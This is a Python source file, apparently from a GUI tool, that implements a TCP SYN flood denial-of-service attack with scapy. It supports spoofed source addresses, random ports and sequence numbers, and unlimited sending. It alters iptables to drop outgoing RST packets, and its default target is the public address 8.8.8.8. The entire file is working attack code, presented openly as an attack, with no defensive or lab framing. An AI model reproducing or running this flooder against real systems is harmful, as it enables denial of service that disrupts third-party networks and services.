import time
import random
import threading
from scapy.all import *
import tcp_syn_graphique_2
import sys
import os
import subprocess

class tcp_syn(threading.Thread):


	def __init__(self,ip_src,port_src,ip_dst,port_dst,num_seq,nombre,attente,interface):

		threading.Thread.__init__(self)
		self.stopper=threading.Event()
				

		if(ip_src == ""):

			if(ip_dst==""):
				self.ip=IP(dst="8.8.8.8")
			else:
				self.ip=IP(dst=ip_dst)
		else:
			if(ip_dst==""):
				self.ip=IP(src=ip_src,dst="8.8.8.8")
			else:
				self.ip=IP(src=ip_src,dst=ip_dst)

		self.IsNotSpoofedSourceIpAdress=(self.ip.src == IP().src)

		## TEST TO SEE IF THE IP ADRESS IS SPOOFED
		if(self.IsNotSpoofedSourceIpAdress == True):
			print("\n IP ADRESS IS NOT SPOOFED")
		else:
			print("\n IP ADRESS IS SPOOFED")
	
		##TEST DU PORT DESTINATION
		if(port_dst == ""):
			self.portdst=80
		else:
			self.portdst=int(port_dst)
		
		## TEST DU NUMERO DE SEQUENCE
		if(num_seq == ""):
			self.s1=1
			self.s2=100000
		else:
			self.s1=int(num_seq.split("-")[0])
			self.s2=int(num_seq.split("-")[1])				

		
		##TEST DE L'INTERFACE D'ENVOI
		if(interface != ""):
			print("interface not chosen automatically")
			conf.iface=interface
		else:
			print("interface chosen automatically")
		

		if(interface != ""):
			print("PACKETS SENDING INTERFACE:"+interface)
		else:
			print("PACKETS SENDING INTERFACE:"+conf.iface)


		##TEST DU DELAI AVANT CHAQUE ENVOI
		if(attente == ""):
			self.delai=0.2
		else:
			self.delai=float(attente)



		##TEST DU PORT SOURCE
		if(port_src == ""):
			self.p1=1000
			self.p2=30000
		else:
			self.p1=int(port_src.split("-")[0])
			self.p2=int(port_src.split("-")[1])


		if(nombre == ""):
			self.n=-1
		else:
			self.n=int(nombre)


	def run(self):	
		
		if(tcp_syn_graphique_2.verrou.locked()):
			print("\n ERROR ANOTHER ATTACK IN PROGRESS DETECTED")
		else:
			print("\n NO ATTACK IN PROGRESS DETECTED\n")

			tcp_syn_graphique_2.verrou.acquire()

			if(self.IsNotSpoofedSourceIpAdress == True):
				subprocess.check_call(['iptables', '-A','OUTPUT', '-p', 'tcp', '-s', self.ip.src,'--tcp-flags', 'RST','RST','-j', 'DROP'])			
			
			self.ip.show()		
			print("Soure Port="+str(self.p1)+"-"+str(self.p2))
			print("Destination Port="+str(self.portdst))
		
			time.sleep(3)

			print("\n Starting the Attack TCP SYN FLOOD --"+time.ctime()+"\n")
			if(self.n == -1):
				while(1==1 and not(self.stopper.isSet())):
					port=random.randint(self.p1,self.p2)
					sequence=random.randint(self.s1,self.s2)
					tcp_syn=TCP(sport=port,dport=self.portdst,flags='S',seq=sequence)
		
					'''CREATION DU PAQUET'''
					paquet=(self.ip/tcp_syn)
					send(paquet)
					time.sleep(self.delai)
				
				if(not self.stopper.isSet()):
					print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
				else:
					print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")
			else:
				i=0
				for i in range(0,self.n):
					port=random.randint(self.p1,self.p2)
					sequence=random.randint(self.s1,self.s2)
					tcp_syn=TCP(sport=port,dport=self.portdst,flags='S',seq=sequence)
		
					'''CREATION DU PAQUET'''
					paquet=(self.ip/tcp_syn)
					send(paquet)
					time.sleep(self.delai)

					if(self.stopper.isSet()):
						break
				if(not self.stopper.isSet()):
					print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
				else:
					print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")

			if(self.IsNotSpoofedSourceIpAdress == True):
				subprocess.check_call(['iptables', '-A','OUTPUT', '-p', 'tcp', '-s', self.ip.src,'--tcp-flags', 'RST','RST','-j', 'ACCEPT'])

	
			tcp_syn_graphique_2.verrou.release()

	
	def state_launch_boutton(self):
		return self.stopper.isSet()
	
	def stop(self):
		self.stopper.set()
	
	def randommac():
		mac = [ random.randint(0x00, 0x7f), random.randint(0x00, 0x7f), random.randint(0x00, 0x7f),
			random.randint(0x00, 0x7f),
			random.randint(0x00, 0xff),
			random.randint(0x00, 0xff) ]
		return ':'.join(map(lambda x: "%02x" % x, mac))		
